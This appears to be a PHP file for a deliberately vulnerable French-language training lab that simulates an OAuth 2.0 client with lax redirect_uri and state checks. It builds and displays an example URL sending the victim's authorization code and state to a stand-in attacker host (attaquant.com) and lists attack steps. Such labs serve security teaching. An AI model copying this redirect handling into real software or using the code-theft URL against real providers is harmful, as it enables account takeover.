<?php
// Simuler les identifiants OAuth
$CLIENT_ID = "app-client-8109";
$SECRET_KEY = "app-secret-key-8109";

// Simuler l'URL du fournisseur d'identité (IdP)
$IDP_AUTH_URL = "http://fake-idp.com/auth"; 

// ⚠️ VULNÉRABILITÉ OAUTH ⚠️: Redirection ouverte ou validation de state / redirect_uri laxiste

$code = $_GET['code'] ?? null;
$state = $_GET['state'] ?? null;
$error = $_GET['error'] ?? null;
$redirect_uri_param = $_GET['redirect_uri'] ?? 'http://localhost:8109/';

$message = "";

if ($error) {
    $message = "<p style='color: red;'>Erreur d'authentification: " . htmlspecialchars($error) . "</p>";
} elseif ($code && $state) {
    // 1. L'application reçoit le code et le state
    
    // 2. ⚠️ VULNÉRABILITÉ ⚠️: Le client ne vérifie pas que le 'redirect_uri' est sûr.
    // L'attaquant peut forcer l'IdP à rediriger le code vers une URL contrôlée si
    // le client n'a pas listé ses URLs de redirection.
    
    // 3. Simuler l'échange de code contre un jeton (ne se produit pas ici, mais le code est le secret)
    $message = "<p style='color: green;'>Authentification réussie !</p>";
    $message .= "<p>Code d'autorisation (SECRET) reçu : <strong>" . htmlspecialchars($code) . "</strong></p>";
    $message .= "<p>Paramètre d'état (pour la protection CSRF) : <strong>" . htmlspecialchars($state) . "</strong></p>";
    
    // Simuler le comportement d'une redirection vulnérable
    // Si l'application utilisait le code et le state pour rediriger vers une page vulnérable
    // où le state serait reflété sans encodage, ou si le redirect_uri était ouvert.
    
    if (isset($_GET['exploit'])) {
        // Redirection vulnérable vers l'URL fournie par l'attaquant
        $malicious_redirect = "http://attaquant.com/capture?code=" . $code . "&state=" . $state;
        $message .= "<p style='color: red;'>** ALERTE : Le code aurait été redirigé vers l'attaquant (non exécuté dans ce lab). **</p>";
        $message .= "<p>URL malveillante générée : <code>" . htmlspecialchars($malicious_redirect) . "</code></p>";
    }
    
} else {
    // Lien de démarrage
    $message = "<p>Pour commencer, simulez l'authentification avec le fournisseur d'identité :</p>";
    $auth_link = "http://localhost:8109/?code=AUTHCODE-VICTIM-12345&state=CSRF-STATE-ABCDE";
    $message .= "<p><a href='" . htmlspecialchars($auth_link) . "'>Simuler la réception du Code d'Authentification</a></p>";
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>OAuth 2.0 State Leak Lab</title>
    <style>
        body { font-family: "Arial", sans-serif; background-color: #f4f4f9; margin: 20px; }
        .vulnerability-note { background-color: #e74c3c; color: white; padding: 10px; border-radius: 4px; text-align: center; margin-bottom: 15px; }
    </style>
</head>
<body>
    <div class="vulnerability-note">VULNÉRABILITÉ: OAuth 2.0 State Parameter Leak - Port 8109</div>
    <h1>Lab 30 - Client OAuth (Redirection Insecure)</h1>
    <?php echo $message; ?>
    
    <h3>Instructions pour l'Attaque</h3>
    <p>1. L'application cliente (ce lab) devrait utiliser un paramètre <code>redirect_uri</code> pour l'IdP qui pointe uniquement vers elle-même.</p>
    <p>2. Si l'attaquant peut manipuler le <code>redirect_uri</code> (par exemple, en injectant une URL malveillante comme fragment ou dans un paramètre non sécurisé) ou si l'IdP l'autorise :</p>
    <p>URL d'Attaque Simulé (non exécutable ici, mais le concept est de voler le code et le state) :</p>
    <p><code>http://fake-idp.com/auth?client_id=...&redirect_uri=**http://attaquant.com/capture**</code></p>
    <p>3. **Dans ce lab**, l'injection du `state` ou du `code` dans une réponse non sécurisée permettrait de le voler via XSS ou de le forcer sur un domaine non valide.</p>

</body>
</html>
